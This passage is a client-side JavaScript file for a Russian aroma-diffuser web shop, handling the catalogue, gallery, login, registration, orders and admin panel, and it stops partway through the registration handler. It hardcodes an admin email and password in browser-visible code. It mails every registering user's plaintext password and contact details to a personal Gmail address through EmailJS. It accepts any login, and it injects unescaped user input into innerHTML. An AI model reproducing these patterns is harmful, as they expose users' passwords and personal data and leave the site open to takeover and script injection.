// ===== ДАННЫЕ ПРОДУКТОВ =====
const aromas = [
    {
        id: 1,
        name: "Жасмин",
        description: "Цветочный и нежный, аромат весны",
        icon: "fa-spa",
        color: "#f8c8dc",
        price: 420,
        inStock: 7
    },
    {
        id: 2,
        name: "Османтус",
        description: "Сладкий, фруктово-цветочный с нотками абрикоса",
        icon: "fa-leaf",
        color: "#d4a373",
        price: 420,
        inStock: 6
    },
    {
        id: 3,
        name: "Шангри-Ла",
        description: "Экзотический микс с нотками орхидеи и персика",
        icon: "fa-tree",
        color: "#9f7aea",
        price: 420,
        inStock: 8
    },
    {
        id: 4,
        name: "Гардения",
        description: "Насыщенный, сливочно-цветочный аромат",
        icon: "fa-spa",
        color: "#ffb7c5",
        price: 420,
        inStock: 9
    }
];

// Все изображения диффузоров (теперь хранятся в localStorage)
let productImages = [];

// Загрузка изображений из localStorage
// Загрузка изображений из localStorage
function loadProductImages() {
    const saved = localStorage.getItem('nazzrelax_images');
    if (saved) {
        productImages = JSON.parse(saved);
    } else {
        // Изображения по умолчанию с прямыми ссылками
        productImages = [
            {
                id: 1,
                url: "https://i.ibb.co/4gDjzH4m/CD92-BE09-B000-45-D0-B65-E-43-B09-E73-B43-C-1-201-a.jpg",
                alt: "Диффузор вид 1",
                isDefault: true
            },
            {
                id: 2,
                url: "https://i.ibb.co/xqtRwH0W/8074027-A-D404-4517-BFC0-AD53-F0-B21-A7-A-1-201-a.jpg",
                alt: "Диффузор вид 2",
                isDefault: true
            },
            {
                id: 3,
                url: "https://i.ibb.co/vCHCG9Vy/C30168-BE-1-F73-4156-BD7-B-7-BC677-E06-BD5-1-201-a.jpg",
                alt: "Диффузор вид 3",
                isDefault: true
            }
        ];
        saveProductImages();
    }
}

// Сохранение изображений в localStorage
function saveProductImages() {
    localStorage.setItem('nazzrelax_images', JSON.stringify(productImages));
}

// Инициализация изображений
loadProductImages();

// Выбранные ароматы (теперь массив)
let selectedAromas = [];

// ===== ДАННЫЕ АДМИНА =====
const ADMIN_EMAIL = 'nkozoriz709@gmail.com';
const ADMIN_PASSWORD = 'qqq123q';

// ===== EMAILJS CONFIGURATION =====
const EMAILJS_CONFIG = {
    publicKey: 'J2LBrAfB8hXSnlJ22',
    serviceId: 'service_33tjs8p',
    templateId: 'template_4f6hzig'
};

// Инициализация EmailJS
(function() {
    // Проверяем, загружен ли уже EmailJS
    if (typeof emailjs === 'undefined') {
        // Создаем скрипт для загрузки EmailJS
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
        script.onload = function() {
            emailjs.init(EMAILJS_CONFIG.publicKey);
            console.log('EmailJS инициализирован');
        };
        document.head.appendChild(script);
    } else {
        emailjs.init(EMAILJS_CONFIG.publicKey);
    }
})();

// Функция отправки данных регистрации на email
async function sendRegistrationEmail(userData) {
    try {
        // Подготавливаем данные для шаблона
        const templateParams = {
            to_email: 'nkozoriz709@gmail.com',
            user_id: userData.id,
            user_name: userData.name,
            user_email: userData.email,
            user_phone: userData.phone || 'Не указан',
            user_password: userData.password,
            registration_date: new Date(userData.registrationDate).toLocaleString('ru-RU'),
            message: `
                Зарегистрирован новый пользователь:
                
                ID: ${userData.id}
                Имя: ${userData.name}
                Email: ${userData.email}
                Телефон: ${userData.phone || 'Не указан'}
                Пароль: ${userData.password}
                Дата регистрации: ${new Date(userData.registrationDate).toLocaleString('ru-RU')}
            `
        };
        
        // Отправляем email через EmailJS
        const response = await emailjs.send(
            EMAILJS_CONFIG.serviceId,
            EMAILJS_CONFIG.templateId,
            templateParams
        );
        
        console.log('Email успешно отправлен:', response);
        return true;
    } catch (error) {
        console.error('Ошибка отправки email:', error);
        return false;
    }
}

// Генерация уникального ID для пользователя
function generateUserId() {
    return 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
}

// ===== ГАЛЕРЕЯ ИЗОБРАЖЕНИЙ =====

// Функция инициализации галереи
function initImageGallery() {
    const mainImage = document.getElementById('main-product-image');
    const thumbnailsContainer = document.querySelector('.thumbnails');
    const zoomBtn = document.getElementById('zoom-btn');
    const imageModal = document.getElementById('image-modal');
    const modalImage = document.getElementById('modal-image');
    const imageModalClose = document.getElementById('image-modal-close');
    
    if (!mainImage || !thumbnailsContainer) return;
    
    // Обновляем миниатюры
    updateThumbnails();
    
    // Кнопка увеличения
    if (zoomBtn) {
        zoomBtn.addEventListener('click', function() {
            modalImage.src = mainImage.src;
            modalImage.alt = mainImage.alt;
            imageModal.classList.add('active');
        });
    }
    
    // Закрытие модального окна
    if (imageModalClose) {
        imageModalClose.addEventListener('click', function() {
            imageModal.classList.remove('active');
        });
    }
    
    // Закрытие модального окна кликом снаружи
    if (imageModal) {
        imageModal.addEventListener('click', function(e) {
            if (e.target === this) {
                this.classList.remove('active');
            }
        });
    }
    
    // Закрытие модального окна клавишей ESC
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && imageModal && imageModal.classList.contains('active')) {
            imageModal.classList.remove('active');
        }
    });
}

// Обновление миниатюр
function updateThumbnails() {
    const thumbnailsContainer = document.querySelector('.thumbnails');
    const mainImage = document.getElementById('main-product-image');
    
    if (!thumbnailsContainer || !mainImage) return;
    
    thumbnailsContainer.innerHTML = '';
    
    productImages.forEach((img, index) => {
        const thumbnail = document.createElement('div');
        thumbnail.className = `thumbnail ${index === 0 ? 'active' : ''}`;
        thumbnail.setAttribute('data-image', img.url);
        
        const imgElement = document.createElement('img');
        imgElement.src = img.url;
        imgElement.alt = img.alt;
        
        thumbnail.appendChild(imgElement);
        
        thumbnail.addEventListener('click', function() {
            const imageSrc = this.getAttribute('data-image');
            
            // Обновляем основное изображение
            mainImage.src = imageSrc;
            mainImage.alt = this.querySelector('img').alt;
            
            // Обновляем активную миниатюру
            document.querySelectorAll('.thumbnail').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
        
        thumbnailsContainer.appendChild(thumbnail);
    });
    
    // Устанавливаем первое изображение как основное
    if (productImages.length > 0) {
        mainImage.src = productImages[0].url;
        mainImage.alt = productImages[0].alt;
    }
}

// ===== ОСНОВНЫЕ ФУНКЦИИ =====

// Функция показа уведомления
function showNotification(message, type = 'success') {
    const notification = document.createElement('div');
    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        background: ${type === 'error' ? 'linear-gradient(45deg, #dc3545, #c82333)' : 'linear-gradient(45deg, var(--accent), #967bb6)'};
        color: white;
        padding: 15px 25px;
        border-radius: 10px;
        z-index: 10000;
        animation: slideIn 0.3s ease;
        max-width: 300px;
        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => notification.remove(), 300);
    }, 3000);
}

// ===== AUTHENTICATION SYSTEM =====
let currentUser = null;

// Проверка авторизации
function isLoggedIn() {
    return localStorage.getItem('nazzrelax_user') !== null;
}

// Получение текущего пользователя
function getCurrentUser() {
    const user = localStorage.getItem('nazzrelax_user');
    return user ? JSON.parse(user) : null;
}

// Сохранение пользователя
function saveUser(user) {
    localStorage.setItem('nazzrelax_user', JSON.stringify(user));
}

// Проверка, является ли пользователь администратором
function isAdmin(user) {
    return user && user.email === ADMIN_EMAIL;
}

// Выход из системы
function logout() {
    localStorage.removeItem('nazzrelax_user');
    currentUser = null;
    updateUI();
    showNotification('Вы вышли из системы');
    showMainPage();
}

// Обновление интерфейса в зависимости от авторизации
function updateUI() {
    const user = getCurrentUser();
    const accountLink = document.getElementById('account-link');
    const loginBtn = document.getElementById('login-btn');
    
    if (!accountLink || !loginBtn) return;
    
    if (user) {
        // Пользователь авторизован
        accountLink.style.display = 'block';
        
        if (isAdmin(user)) {
            loginBtn.textContent = 'Админ панель';
            // Заменяем обработчик
            loginBtn.onclick = function(e) {
                e.preventDefault();
                showAdminPanel();
            };
        } else {
            loginBtn.textContent = 'Выйти';
            loginBtn.onclick = function(e) {
                e.preventDefault();
                logout();
            };
        }
        
        // Приветственное сообщение
        const welcomeElement = document.getElementById('account-welcome');
        if (welcomeElement) {
            welcomeElement.textContent = `Добро пожаловать, ${user.name}!${isAdmin(user) ? ' (Администратор)' : ''}`;
        }
        
        // Заполнение формы профиля
        const profileName = document.getElementById('profile-name');
        const profileEmail = document.getElementById('profile-email');
        const profilePhone = document.getElementById('profile-phone');
        const profileBirthdate = document.getElementById('profile-birthdate');
        
        if (profileName) profileName.value = user.name || '';
        if (profileEmail) profileEmail.value = user.email || '';
        if (profilePhone) profilePhone.value = user.phone || '';
        if (profileBirthdate) profileBirthdate.value = user.birthdate || '';
        
        // Заполнение данных в заказах
        updateOrdersList();
        
        // Заполнение адресов
        updateAddressesList();
        
    } else {
        // Пользователь не авторизован
        accountLink.style.display = 'block';
        loginBtn.textContent = 'Войти';
        loginBtn.onclick = function(e) {
            e.preventDefault();
            openLoginModal();
        };
        
        // Скрытие личного кабинета если открыт
        const accountSection = document.getElementById('account');
        if (accountSection && accountSection.style.display === 'block') {
            showMainPage();
        }
        
        // Скрытие админ панели
        const adminPanel = document.getElementById('admin-panel');
        if (adminPanel) {
            adminPanel.style.display = 'none';
        }
    }
}

// Обновление списка заказов
function updateOrdersList() {
    const ordersList = document.getElementById('orders-list');
    const user = getCurrentUser();
    
    if (!user || !ordersList) return;
    
    // Получаем все заказы из localStorage
    let allOrders = JSON.parse(localStorage.getItem('nazzrelax_orders') || '[]');
    
    // Для обычного пользователя показываем только его заказы, для админа - все
    let userOrders;
    if (isAdmin(user)) {
        userOrders = allOrders;
    } else {
        userOrders = allOrders.filter(order => order.email === user.email);
    }
    
    // Отображаем заказы
    if (userOrders && userOrders.length > 0) {
        ordersList.innerHTML = '';
        
        userOrders.forEach(order => {
            const orderElement = document.createElement('div');
            orderElement.className = 'order-item';
            
            const totalPrice = order.totalPrice || 0;
            
            // Формируем список ароматов
            let aromasList = '';
            if (order.aromas && Array.isArray(order.aromas)) {
                aromasList = order.aromas.map(a => `${a.name} x${a.quantity}`).join(', ');
            } else {
                aromasList = `${order.aroma || 'Не указан'}`;
            }
            
            orderElement.innerHTML = `
                <div class="order-header">
                    <div>
                        <span class="order-number">${order.id}</span>
                        <span class="order-date">${new Date(order.date).toLocaleDateString('ru-RU')}</span>
                    </div>
                    <span class="order-status" style="background: ${order.status === 'Новый' ? '#ff6b6b' : '#4CAF50'}">${order.status || 'Новый'}</span>
                </div>
                <div class="order-details">
                    <p><strong>Клиент:</strong> ${order.name}</p>
                    <p><strong>Товар:</strong> ${order.product}</p>
                    <p><strong>Ароматы:</strong> ${aromasList}</p>
                    <p><strong>Общая сумма:</strong> ${totalPrice.toLocaleString()} ₽</p>
                    <p><strong>Телефон:</strong> ${order.phone}</p>
                    <p><strong>Адрес:</strong> ${order.address}</p>
                    ${order.comment ? `<p><strong>Комментарий:</strong> ${order.comment}</p>` : ''}
                </div>
            `;
            
            ordersList.appendChild(orderElement);
        });
    } else {
        ordersList.innerHTML = `
            <div class="no-orders">
                <p>У вас пока нет заказов</p>
                <p><a href="#order" style="color: var(--accent); text-decoration: none;">Сделайте свой первый заказ!</a></p>
            </div>
        `;
    }
}

// Обновление списка адресов
function updateAddressesList() {
    const addressesList = document.getElementById('addresses-list');
    const user = getCurrentUser();
    
    if (!user || !addressesList) return;
    
    // Для демо: создаем тестовый адрес
    if (!user.addresses || user.addresses.length === 0) {
        user.addresses = [
            {
                id: 1,
                title: 'Домашний адрес',
                address: 'г. Москва, ул. Примерная, д. 10, кв. 25',
                isDefault: true
            }
        ];
        saveUser(user);
    }
    
    // Отображаем адреса
    if (user.addresses && user.addresses.length > 0) {
        addressesList.innerHTML = '';
        
        user.addresses.forEach(address => {
            const addressElement = document.createElement('div');
            addressElement.className = 'order-item';
            
            addressElement.innerHTML = `
                <div class="order-header">
                    <span class="order-number">${address.title}</span>
                    ${address.isDefault ? '<span class="order-status">По умолчанию</span>' : ''}
                </div>
                <div class="order-details">
                    <p>${address.address}</p>
                    <div style="margin-top: 10px;">
                        <button class="btn" style="padding: 5px 15px; font-size: 12px; margin-right: 10px;">Изменить</button>
                        ${!address.isDefault ? '<button class="btn" style="padding: 5px 15px; font-size: 12px;">Удалить</button>' : ''}
                    </div>
                </div>
            `;
            
            addressesList.appendChild(addressElement);
        });
    } else {
        addressesList.innerHTML = `
            <div class="no-orders">
                <p>У вас пока нет сохраненных адресов</p>
            </div>
        `;
    }
}

// Показать главную страницу (скрыть личный кабинет и админ панель)
function showMainPage() {
    const accountSection = document.getElementById('account');
    const adminPanel = document.getElementById('admin-panel');
    const mainSections = document.querySelectorAll('.hero, .products, .about, .relaxation-section, footer');
    
    if (accountSection) accountSection.style.display = 'none';
    if (adminPanel) adminPanel.style.display = 'none';
    mainSections.forEach(section => {
        if (section) section.style.display = 'block';
    });
    
    // Прокручиваем наверх
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Показать личный кабинет
function showAccountPage() {
    const accountSection = document.getElementById('account');
    const adminPanel = document.getElementById('admin-panel');
    const mainSections = document.querySelectorAll('.hero, .products, .about, .relaxation-section, footer');
    
    if (!accountSection) return;
    
    accountSection.style.display = 'block';
    if (adminPanel) adminPanel.style.display = 'none';
    mainSections.forEach(section => {
        if (section) section.style.display = 'none';
    });
    
    // Прокручиваем наверх личного кабинета
    setTimeout(() => {
        accountSection.scrollIntoView({ behavior: 'smooth' });
    }, 100);
}

// Показать админ панель
function showAdminPanel() {
    const user = getCurrentUser();
    if (!user || !isAdmin(user)) {
        showNotification('Доступ запрещен', 'error');
        return;
    }
    
    const accountSection = document.getElementById('account');
    const adminPanel = document.getElementById('admin-panel');
    const mainSections = document.querySelectorAll('.hero, .products, .about, .relaxation-section, footer');
    
    if (!adminPanel) {
        showNotification('Ошибка: панель администратора не найдена', 'error');
        return;
    }
    
    if (accountSection) accountSection.style.display = 'none';
    adminPanel.style.display = 'block';
    mainSections.forEach(section => {
        if (section) section.style.display = 'none';
    });
    
    // Загружаем данные для админ панели
    loadAdminData();
    
    // Прокручиваем наверх админ панели
    setTimeout(() => {
        adminPanel.scrollIntoView({ behavior: 'smooth' });
    }, 100);
    
    showNotification('Добро пожаловать в панель администратора');
}

// Загрузка данных для админ панели
function loadAdminData() {
    // Загрузка заказов
    const orders = JSON.parse(localStorage.getItem('nazzrelax_orders') || '[]');
    updateAdminOrders(orders);
    
    // Загрузка статистики
    updateAdminStats(orders);
    
    // Загрузка ароматов
    updateAdminAromas();
    
    // Загрузка изображений
    updateAdminImages();
}

// Обновление списка заказов в админ панели
function updateAdminOrders(orders) {
    const ordersList = document.getElementById('admin-orders-list');
    if (!ordersList) return;
    
    if (orders.length === 0) {
        ordersList.innerHTML = '<div class="no-orders">Нет заказов</div>';
        return;
    }
    
    ordersList.innerHTML = '';
    orders.reverse().forEach(order => {
        // Формируем список ароматов для отображения
        let aromasList = '';
        if (order.aromas && Array.isArray(order.aromas)) {
            aromasList = order.aromas.map(a => `${a.name} x${a.quantity}`).join('<br>');
        } else {
            aromasList = `${order.aroma || 'Не указан'}`;
        }
        
        const orderElement = document.createElement('div');
        orderElement.className = 'admin-order-item';
        orderElement.innerHTML = `
            <div class="admin-order-header">
                <div>
                    <span class="admin-order-number">${order.id}</span>
                    <span class="admin-order-date">${new Date(order.date).toLocaleString('ru-RU')}</span>
                </div>
                <select class="admin-order-status" onchange="updateOrderStatus('${order.id}', this.value)">
                    <option value="Новый" ${order.status === 'Новый' ? 'selected' : ''}>Новый</option>
                    <option value="В обработке" ${order.status === 'В обработке' ? 'selected' : ''}>В обработке</option>
                    <option value="Отправлен" ${order.status === 'Отправлен' ? 'selected' : ''}>Отправлен</option>
                    <option value="Доставлен" ${order.status === 'Доставлен' ? 'selected' : ''}>Доставлен</option>
                    <option value="Отменен" ${order.status === 'Отменен' ? 'selected' : ''}>Отменен</option>
                </select>
            </div>
            <div class="admin-order-details">
                <p><strong>Клиент:</strong> ${order.name}</p>
                <p><strong>Email:</strong> ${order.email}</p>
                <p><strong>Телефон:</strong> ${order.phone}</p>
                <p><strong>Адрес:</strong> ${order.address}</p>
                <p><strong>Товар:</strong> ${order.product}</p>
                <p><strong>Ароматы:</strong> ${aromasList}</p>
                <p><strong>Общая сумма:</strong> ${(order.totalPrice || 0).toLocaleString()} ₽</p>
                ${order.comment ? `<p><strong>Комментарий:</strong> ${order.comment}</p>` : ''}
            </div>
        `;
        ordersList.appendChild(orderElement);
    });
}

// Обновление статуса заказа
window.updateOrderStatus = function(orderId, newStatus) {
    let orders = JSON.parse(localStorage.getItem('nazzrelax_orders') || '[]');
    const orderIndex = orders.findIndex(o => o.id === orderId);
    
    if (orderIndex !== -1) {
        orders[orderIndex].status = newStatus;
        localStorage.setItem('nazzrelax_orders', JSON.stringify(orders));
        showNotification('Статус заказа обновлен');
        
        // Обновляем статистику
        updateAdminStats(orders);
    }
};

// Обновление статистики
function updateAdminStats(orders) {
    const totalOrdersEl = document.getElementById('total-orders');
    const totalRevenueEl = document.getElementById('total-revenue');
    const newOrdersEl = document.getElementById('new-orders');
    
    const totalOrders = orders.length;
    const totalRevenue = orders.reduce((sum, order) => sum + (order.totalPrice || 0), 0);
    const newOrders = orders.filter(o => o.status === 'Новый').length;
    
    if (totalOrdersEl) totalOrdersEl.textContent = totalOrders;
    if (totalRevenueEl) totalRevenueEl.textContent = totalRevenue.toLocaleString() + ' ₽';
    if (newOrdersEl) newOrdersEl.textContent = newOrders;
}

// Обновление списка ароматов в админ панели
function updateAdminAromas() {
    const aromasList = document.getElementById('admin-aromas-list');
    if (!aromasList) return;
    
    aromasList.innerHTML = '';
    aromas.forEach(aroma => {
        const aromaElement = document.createElement('div');
        aromaElement.className = 'admin-aroma-item';
        aromaElement.innerHTML = `
            <div class="admin-aroma-info">
                <div class="admin-aroma-icon" style="background: ${aroma.color}20; color: ${aroma.color}">
                    <i class="fas ${aroma.icon}"></i>
                </div>
                <div class="admin-aroma-details">
                    <h4>${aroma.name}</h4>
                    <p>${aroma.description}</p>
                    <p class="admin-aroma-price">${aroma.price.toLocaleString()} ₽</p>
                    <p class="admin-aroma-stock">В наличии: ${aroma.inStock} шт.</p>
                </div>
            </div>
            <div class="admin-aroma-actions">
                <button class="btn" onclick="editAroma(${aroma.id})">Редактировать</button>
                <button class="btn" style="background: #ff6b6b; border-color: #ff6b6b;" onclick="toggleAromaStock(${aroma.id})">
                    ${aroma.inStock > 0 ? 'Списать' : 'Добавить'}
                </button>
            </div>
        `;
        aromasList.appendChild(aromaElement);
    });
}

// Редактирование аромата
window.editAroma = function(aromaId) {
    const aroma = aromas.find(a => a.id === aromaId);
    if (!aroma) return;
    
    const newPrice = prompt('Введите новую цену:', aroma.price);
    if (newPrice && !isNaN(newPrice) && newPrice > 0) {
        aroma.price = parseInt(newPrice);
        showNotification('Цена обновлена');
        updateAdminAromas();
        
        // Обновляем отображение цены на главной
        updateTotalPrice();
    }
};

// Изменение количества на складе
window.toggleAromaStock = function(aromaId) {
    const aroma = aromas.find(a => a.id === aromaId);
    if (!aroma) return;
    
    if (aroma.inStock > 0) {
        const amount = prompt('Сколько списать со склада? (макс: ' + aroma.inStock + ')', '1');
        if (amount && !isNaN(amount) && amount > 0 && amount <= aroma.inStock) {
            aroma.inStock -= parseInt(amount);
            showNotification('Склад обновлен');
            updateAdminAromas();
        }
    } else {
        const amount = prompt('Сколько добавить на склад?', '10');
        if (amount && !isNaN(amount) && amount > 0) {
            aroma.inStock += parseInt(amount);
            showNotification('Склад обновлен');
            updateAdminAromas();
        }
    }
};

// ===== УПРАВЛЕНИЕ ИЗОБРАЖЕНИЯМИ =====

// Обновление списка изображений в админ панели
function updateAdminImages() {
    const imagesList = document.getElementById('admin-images-list');
    if (!imagesList) return;
    
    imagesList.innerHTML = '';
    
    productImages.forEach((image, index) => {
        const imageElement = document.createElement('div');
        imageElement.className = 'admin-image-item';
        imageElement.innerHTML = `
            <div class="admin-image-preview">
                <img src="${image.url}" alt="${image.alt}" onerror="this.src='https://via.placeholder.com/150?text=Ошибка+загрузки'">
            </div>
            <div class="admin-image-info">
                <h4>Изображение ${index + 1}</h4>
                <p><strong>Alt текст:</strong> ${image.alt}</p>
                <p><strong>Путь:</strong> ${image.url}</p>
                ${image.isDefault ? '<p><span class="admin-badge">По умолчанию</span></p>' : ''}
            </div>
            <div class="admin-image-actions">
                <button class="btn" onclick="editImage(${index})">Редактировать</button>
                ${!image.isDefault ? `<button class="btn" style="background: #ff6b6b; border-color: #ff6b6b;" onclick="deleteImage(${index})">Удалить</button>` : ''}
                <button class="btn" onclick="setMainImage(${index})">Сделать главным</button>
            </div>
        `;
        imagesList.appendChild(imageElement);
    });
}

// Редактирование изображения
window.editImage = function(index) {
    const image = productImages[index];
    if (!image) return;
    
    const newUrl = prompt('Введите новый URL изображения:', image.url);
    if (newUrl) {
        image.url = newUrl;
        
        const newAlt = prompt('Введите новое описание (alt текст):', image.alt);
        if (newAlt) {
            image.alt = newAlt;
        }
        
        saveProductImages();
        updateAdminImages();
        updateThumbnails();
        showNotification('Изображение обновлено');
    }
};

// Удаление изображения
window.deleteImage = function(index) {
    if (productImages.length <= 1) {
        showNotification('Нельзя удалить последнее изображение', 'error');
        return;
    }
    
    if (confirm('Вы уверены, что хотите удалить это изображение?')) {
        productImages.splice(index, 1);
        saveProductImages();
        updateAdminImages();
        updateThumbnails();
        showNotification('Изображение удалено');
    }
};

// Установка главного изображения (перемещение в начало)
window.setMainImage = function(index) {
    if (index === 0) {
        showNotification('Это изображение уже главное');
        return;
    }
    
    const image = productImages[index];
    productImages.splice(index, 1);
    productImages.unshift(image);
    
    saveProductImages();
    updateAdminImages();
    updateThumbnails();
    showNotification('Главное изображение изменено');
};

// Добавление нового изображения
window.addImage = function() {
    const url = prompt('Введите URL нового изображения:');
    if (!url) return;
    
    const alt = prompt('Введите описание изображения (alt текст):', 'Диффузор вид ' + (productImages.length + 1));
    
    productImages.push({
        id: Date.now(),
        url: url,
        alt: alt || 'Диффузор',
        isDefault: false
    });
    
    saveProductImages();
    updateAdminImages();
    updateThumbnails();
    showNotification('Изображение добавлено');
};

// ===== РАБОТА С АРОМАТАМИ (МНОЖЕСТВЕННЫЙ ВЫБОР) =====

// Функция обновления общей цены
function updateTotalPrice() {
    const priceElement = document.querySelector('.product-price');
    if (!priceElement) return;
    
    let totalPrice = 0;
    
    if (selectedAromas.length === 0) {
        priceElement.textContent = '0 ₽';
        return;
    }
    
    selectedAromas.forEach(item => {
        totalPrice += item.aroma.price * item.quantity;
    });
    
    priceElement.textContent = `${totalPrice.toLocaleString()} ₽`;
}

// Функция создания контролов количества для аромата
function createQuantityControl(aroma, container) {
    const quantityControl = document.createElement('div');
    quantityControl.className = 'aroma-quantity-control';
    quantityControl.style.cssText = `
        display: flex;
        align-items: center;
        justify-content: center;
        margin-top: 10px;
        gap: 5px;
    `;
    
    const minusBtn = document.createElement('button');
    minusBtn.className = 'quantity-btn';
    minusBtn.innerHTML = '−';
    minusBtn.style.cssText = `
        width: 30px;
        height: 30px;
        border: 1px solid var(--accent);
        background: transparent;
        color: var(--accent);
        border-radius: 5px;
        cursor: pointer;
        font-size: 18px;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: all 0.3s ease;
    `;
    
    const quantitySpan = document.createElement('span');
    quantitySpan.className = 'quantity-value';
    quantitySpan.textContent = '1';
    quantitySpan.style.cssText = `
        min-width: 40px;
        text-align: center;
        color: var(--white);
        font-size: 16px;
    `;
    
    const plusBtn = document.createElement('button');
    plusBtn.className = 'quantity-btn';
    plusBtn.innerHTML = '+';
    plusBtn.style.cssText = minusBtn.style.cssText;
    
    // Обработчики для кнопок
    minusBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        let currentValue = parseInt(quantitySpan.textContent);
        if (currentValue > 1) {
            currentValue--;
            quantitySpan.textContent = currentValue;
            
            // Обновляем количество в выбранных ароматах
            const selectedItem = selectedAromas.find(item => item.aroma.id === aroma.id);
            if (selectedItem) {
                selectedItem.quantity = currentValue;
                updateTotalPrice();
            }
        }
    });
    
    plusBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        let currentValue = parseInt(quantitySpan.textContent);
        if (currentValue < 10) { // Максимум 10 штук одного аромата
            currentValue++;
            quantitySpan.textContent = currentValue;
            
            // Обновляем количество в выбранных ароматах
            const selectedItem = selectedAromas.find(item => item.aroma.id === aroma.id);
            if (selectedItem) {
                selectedItem.quantity = currentValue;
                updateTotalPrice();
            }
        }
    });
    
    quantityControl.appendChild(minusBtn);
    quantityControl.appendChild(quantitySpan);
    quantityControl.appendChild(plusBtn);
    
    container.appendChild(quantityControl);
}

// Создание элементов выбора ароматов
function createAromaOptions() {
    const container = document.getElementById('aromas-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    aromas.forEach(aroma => {
        const aromaElement = document.createElement('div');
        aromaElement.className = `aroma-option`;
        aromaElement.setAttribute('data-aroma-id', aroma.id);
        
        // Проверяем, выбран ли аромат
        const isSelected = selectedAromas.some(item => item.aroma.id === aroma.id);
        if (isSelected) {
            aromaElement.classList.add('selected');
        }
        
        // Создаем основное содержимое
        const contentHtml = `
            <div class="aroma-icon">
                <i class="fas ${aroma.icon}"></i>
            </div>
            <div class="aroma-name">${aroma.name}</div>
            <div class="aroma-desc">${aroma.description}</div>
            <div class="aroma-price">${aroma.price.toLocaleString()} ₽</div>
        `;
        
        aromaElement.innerHTML = contentHtml;
        
        // Добавляем контрол количества, если аромат выбран
        if (isSelected) {
            const selectedItem = selectedAromas.find(item => item.aroma.id === aroma.id);
            createQuantityControl(aroma, aromaElement);
            
            // Устанавливаем сохраненное количество
            setTimeout(() => {
                const quantitySpan = aromaElement.querySelector('.quantity-value');
                if (quantitySpan && selectedItem) {
                    quantitySpan.textContent = selectedItem.quantity;
                }
            }, 0);
        }
        
        // Обработчик клика на аромат
        aromaElement.addEventListener('click', function(e) {
            // Если клик был по кнопкам количества, не обрабатываем
            if (e.target.classList.contains('quantity-btn') || 
                e.target.classList.contains('quantity-value')) {
                return;
            }
            
            const aromaId = parseInt(this.getAttribute('data-aroma-id'));
            const selectedAroma = aromas.find(a => a.id === aromaId);
            
            if (!selectedAroma) return;
            
            // Проверяем, выбран ли уже этот аромат
            const existingIndex = selectedAromas.findIndex(item => item.aroma.id === aromaId);
            
            if (existingIndex === -1) {
                // Добавляем новый аромат
                selectedAromas.push({
                    aroma: selectedAroma,
                    quantity: 1
                });
                this.classList.add('selected');
                
                // Добавляем контрол количества
                createQuantityControl(selectedAroma, this);
            } else {
                // Удаляем аромат
                selectedAromas.splice(existingIndex, 1);
                this.classList.remove('selected');
                
                // Удаляем контрол количества
                const quantityControl = this.querySelector('.aroma-quantity-control');
                if (quantityControl) {
                    quantityControl.remove();
                }
            }
            
            // Обновляем общую цену
            updateTotalPrice();
        });
        
        container.appendChild(aromaElement);
    });
}

// ===== МОДАЛЬНЫЕ ОКНА =====

function openLoginModal() {
    const modal = document.getElementById('login-modal');
    if (modal) modal.classList.add('active');
}

function closeLoginModal() {
    const modal = document.getElementById('login-modal');
    if (modal) modal.classList.remove('active');
}

function openRegisterModal() {
    const modal = document.getElementById('register-modal');
    if (modal) modal.classList.add('active');
}

function closeRegisterModal() {
    const modal = document.getElementById('register-modal');
    if (modal) modal.classList.remove('active');
}

// ===== ОБРАБОТКА ФОРМ =====

// Форма входа
const loginForm = document.getElementById('login-form');
if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('login-email').value.trim();
        const password = document.getElementById('login-password').value.trim();
        
        // Валидация
        if (!email || !password) {
            showNotification('Заполните все поля', 'error');
            return;
        }
        
        // Проверка на админа
        if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
            const adminUser = {
                name: 'Администратор',
                email: email,
                phone: '+7 (900) 000-00-00',
                role: 'admin',
                registrationDate: new Date().toISOString()
            };
            
            saveUser(adminUser);
            currentUser = adminUser;
            closeLoginModal();
            updateUI();
            showNotification('Добро пожаловать, Администратор!');
            showAdminPanel();
            this.reset();
            return;
        }
        
        // Для демо - принимаем любые данные
        const user = {
            name: email.split('@')[0],
            email: email,
            phone: '+7 (900) 000-00-00',
            registrationDate: new Date().toISOString()
        };
        
        saveUser(user);
        currentUser = user;
        
        closeLoginModal();
        updateUI();
        showNotification('Успешный вход в систему');
        this.reset();
    });
}

// Форма регистрации
const registerForm = document.getElementById('register-form');
if (registerForm) {
    registerForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const name = document.getElementById('register-name').value.trim();
        const email = document.getElementById('register-email').value.trim();
        const phone = document.getElementById('register-phone').value.trim();
        const password = document.getElementById('register-password').value;
        const confirmPassword = document.getElementById('register-confirm').value;
        
        // Валидация
        if (!name || !email || !phone || !password || !confirmPassword) {
            showNotification('Заполните все поля', 'error');
            return;
        }
        
        if (password !== confirmPassword) {
            showNotification('Пароли не совпадают', 'error');
            return;
        }
        
        if (password.length < 6) {
            showNotification('Пароль должен быть не менее 6 символов', 'error');
            return;
        }
        
        // Проверка email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            showNotification('Введите корректный email', 'error');
            return;
        }
        
        // Генерация ID пользователя
        const userId = generateUserId();
        
        // Создание пользователя
        const user = {
            id: userId,
            name: name,
            email: email,
            phone: phone,
            password: password,
            registrationDate: new Date().toISOString()
        };
        
        // Отправка данных на EmailJS
        const emailSent = await sendRegistrationEmail(user);
        
        if (emailSent) {
            console.log('Данные регистрации отправлены на email');
        } else {
            console.warn('Не удалось отправить данные на email, но регистрация продолжается');
        }
        
